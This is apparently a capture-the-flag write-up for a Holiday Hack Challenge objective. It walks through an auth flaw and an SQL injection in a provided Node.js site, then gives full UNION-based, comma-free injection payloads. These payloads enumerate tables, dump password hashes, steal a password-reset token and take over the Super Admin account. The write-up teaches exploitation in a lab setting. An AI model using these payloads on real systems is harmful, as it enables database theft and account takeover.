<h1 id="objective-12-frost-tower-website-checkup">Objective 12: Frost Tower Website Checkup</h1>
<p><strong>Location: Studio, Frost Tower, 16<sup>th</sup> Floor, <a href="https://staging.jackfrosttower.com/">https://staging.jackfrosttower.com/</a></strong><br>
<strong>Troll: Ingreta Tude</strong><br>
<strong>Hints provided by Ribb Bonbowford after completion of <a href="https://github.com/joergschwarzwaelder/hhc2021/blob/master/Additional/Elf%20Code%20Python.md">Elf Code Python</a></strong></p>
<p>This objective is to perform a security assessment of the Frost Tower website with the <a href="https://download.holidayhackchallenge.com/2021/frosttower-web.zip">source code</a> being provided.<br>
It has to be found, which job position Jack Frost plans to offer Santa on his todo list.</p>
<h3 id="auth-flaw">Auth flaw</h3>
<p>The application tracks the user’s session in <code>session</code> (login name, user’s role etc.).<br>
It was found that a valid session is also set, if you complete the <a href="https://staging.jackfrosttower.com/contact">contact form</a> whilst the email address is already captured in the database. So you could just register twice to get a valid user session for an unprivileged user.</p>
<pre><code>app.post('/postcontact', function(req, res, next){
[...]
        var rowlength = rows.length;
        if (rowlength &gt;= "1"){
            session = req.session;
            session.uniqueID = email;
            req.flash('info', 'Email Already Exists');
            res.redirect("/contact");
</code></pre>
<h3 id="sqli-flaw">SQLi flaw</h3>
<p>Using this unprivileged user session, an SQLi flaw in the function to get user details could be used to retrieve more information from the database.</p>
<pre><code>app.get('/detail/:id', function(req, res, next) {
    session = req.session;
    var reqparam = req.params['id'];
    var query = "SELECT * FROM uniquecontact WHERE id=";
    if (session.uniqueID){
        try {
            if (reqparam.indexOf(',') &gt; 0){
                var ids = reqparam.split(',');
                reqparam = "0";
                for (var i=0; i&lt;ids.length; i++){
                    query += tempCont.escape(m.raw(ids[i]));
                    query += " OR id="
                }
                query += "?";
            }else{
                query = "SELECT * FROM uniquecontact WHERE id=?"
            }
        } catch (error) {
            console.log(error);
            return res.sendStatus(500);
        }

        tempCont.query(query, reqparam, function(error, rows, fields){
</code></pre>
<p>As only caveat it has to be ensured, that the <strong>comma character has to be avoided</strong> in the SQL statement as the application splits up the query at the commas.<br>
Furthermore it is important to note that “union” requires that the <strong>number of columns on both sides match</strong>.<br>
Due to the fact, that the <code>union</code> database has 7 columns, it has to be ensured, that also on the right hand side of the <code>union</code> 7 columns have to be delivered.</p>
<p>This URL is the base for all following SQLi attacks:</p>
<pre><code>https://staging.jackfrosttower.com/detail/461,id union
</code></pre>
<p>During research a <a href="https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/">very good explanation</a> about how to avoid commas in SQL statements and how to get to the right amount of columns was found and the attacks outlined below follow exactly this approach.</p>
<h3 id="getting-access-to-jack-frosts-todo-list">Getting access to Jack Frosts todo list</h3>
<p>We can obtain a list of all interesting tables in the MySQL database using this SQL statement:</p>
<pre><code>select table_name from information_schema.tables;
</code></pre>
<p>This can be rewritten for our SQLi flaw:</p>
<pre><code>select * from (select 1)a1 join (select 2)a2 join (select table_name from information_schema.tables)d join (select 3)j join (select 4)k join (select 5)l join (select 6)m;--
</code></pre>
<p>This reveals, that in addition to the tables <code>emails</code> and <code>uniquecontact</code>, which are known as they are used in the application and in the provided schema of encontact <code>encontact_db.sql</code>, there is an additional table <code>todo</code>, which seems to be the todo list we need access to.</p>
<p>Using the SQL statement</p>
<pre><code>select column_name from information_schema.columns where table_name="todo"
</code></pre>
<p>the list of columns in the table <code>todo</code> can be obtained.<br>
This can be rewritten for the SQLi as follows:</p>
<pre><code>select * from (select 1)a1 join (select 2)a2 join (select column_name from information_schema.columns where table_name="todo")d join (select 3)j join (select 4)k join (select 5)l join (select 6)m;--
</code></pre>
<p>we can see, that this table consists out of 3 columns: <code>id</code>, <code>note</code>, <code>completed</code>.<br>
The <code>note</code> column can then be extracted using</p>
<pre><code>select note from todo
</code></pre>
<p>Rewritten for the SQLi:</p>
<pre><code>select * from (select 1)a1 join (select 2)a2 join (select note from todo)d join (select 3)j join (select 4)k join (select 5)l join (select 6)m;--
</code></pre>
<p>This brings up Jack Frosts todo list:</p>
<ul>
<li>Buy up land all around Santa’s Castle</li>
<li>Build bigger and more majestic tower next to Santa’s</li>
<li>Erode Santa’s influence at the North Pole via FrostFest, the greatest Con in history</li>
<li>Dishearten Santa’s elves and encourage defection to our cause</li>
<li>Steal Santa’s sleigh technology and  build a competing and way better Frosty present delivery vehicle</li>
<li>Undermine Santa’s ability to deliver presents on 12/24 through elf staff shortages, technology glitches, and assorted mayhem</li>
<li>Force Santa to cancel Christmas</li>
<li>SAVE THE DAY by delivering Frosty presents using merch from the Frost Tower Gift Shop to children world-wide… so the whole world sees that Frost saved the Holiday Season!!! Bwahahahahaha!</li>
<li>With Santa defeated, offer the old man a job as a <strong>clerk</strong> in the Frost Tower Gift Shop so we can keep an eye on him</li>
</ul>
<hr>
<h3 id="bonus-getting-super-admin-privileges-in-the-application">Bonus: Getting Super Admin privileges in the application</h3>
<p>Using the SQLi flaw, a full list of registered users and admins (along with password hashes and privilege levels) can be retrieved using this link:</p>
<pre><code>https://staging.jackfrosttower.com/detail/461,id%20union%20select%20*%20from%20users--
</code></pre>
<p>This contains for example:</p>
<ul>
<li>Super Admin</li>
<li>root@localhost</li>
<li>$2b<span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn></mrow><annotation encoding="application/x-tex">10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">10</span></span></span></span></span>JnLy8pq1fC/KrS.bn1NAOx13GzDavIOZJkuayDC7JSCNKvQUha3i</li>
<li>1</li>
<li>November 23rd, 2021 11:00:00</li>
<li>December 18th, 2021 7:05:17</li>
</ul>
<hr>
<ul>
<li>Admin</li>
<li>admin@localhost</li>
<li>$2b<span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn></mrow><annotation encoding="application/x-tex">10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">10</span></span></span></span></span>FTkzq07Az57M.Q8jw7ehB…h5Vdc3Vw04zQzJIt294bgwg7.aV1GC</li>
<li>2</li>
<li>December 3rd, 2021 11:00:00</li>
</ul>
<p>This shows, that we have a “Super Admin” with the email address root@localhost defined in the system.</p>
<p>Next the “<a href="https://staging.jackfrosttower.com/forgotpass">forgot password</a>” function of the application can be used to increase the privileges.<br>
When resetting the password for a user, a random token is created and stored in the user database. If we are able to get hold of this token, we can change the password of the user and have full control.</p>
<p>The token for “root@localhost” can be retrieved using this URL:</p>
<pre><code>https://staging.jackfrosttower.com/detail/-1,-id%20union%20select%20*%20from%20(select%201)a%20join%20(select%202)b%20join%20(select%203)c%20join%20(select%20F.7%20from%20(select%20*%20from%20(select%201)h%20join%20(select%202)i%20join%20(select%203)j%20join%20(select%204)k%20join%20(select%205)l%20join%20(select%206)m%20join%20(select%207)n%20union%20select%20*%20from%20users%20where%20email=%22root@localhost%22)F)d%20join%20(select%204)e%20join%20(select%20%222021-01-01%2000:00:00%22)f%20join%20(select%20%222021-01-01%2000:00:00%22)g;--
</code></pre>
<p>The timestamps in the above URL are required, as the values of these columns undergo a date conversion. This throws an exception if no valid date format is supplied:</p>
<pre><code>TypeError: /app/webpage/detail.ejs:29
    27|                             -
    28|                         &lt;% }else { %&gt;
 &gt;&gt; 29|                             &lt;%= dateFormat(encontact.date_update, "mmmm dS, yyyy h:MM:ss") %&gt;
    30|                         &lt;% } %&gt;                     
    31|                         &lt;/li&gt;
    32|                     &lt;/ul&gt;

Invalid date
    at Object.dateFormat (/app/node_modules/dateformat/lib/dateformat.js:39:17)
    at eval (eval at compile (/app/node_modules/ejs/lib/ejs.js:618:12), &lt;anonymous&gt;:45:26)
    at Array.forEach (&lt;anonymous&gt;)
    at eval (eval at compile (/app/node_modules/ejs/lib/ejs.js:618:12), &lt;anonymous&gt;:21:18)
    at returnedFn (/app/node_modules/ejs/lib/ejs.js:653:17)
    at tryHandleCache (/app/node_modules/ejs/lib/ejs.js:251:36)
    at View.exports.renderFile [as engine] (/app/node_modules/ejs/lib/ejs.js:482:10)
    at View.render (/app/node_modules/express/lib/view.js:135:8)
    at tryRender (/app/node_modules/express/lib/application.js:640:10)
    at Function.render (/app/node_modules/express/lib/application.js:592:3)
</code></pre>
<p>Using the URL <a href="https://staging.jackfrosttower.com/forgotpass/token/">https://staging.jackfrosttower.com/forgotpass/token/</a>{retrieved token} it is possible to set a new password for the “Super Admin” user.<br>
Being logged on as this user, a new personalized user with “Super Admin” privileges can be created.</p>
<p><strong>Achievement: Frost Tower Website Checkup</strong></p>

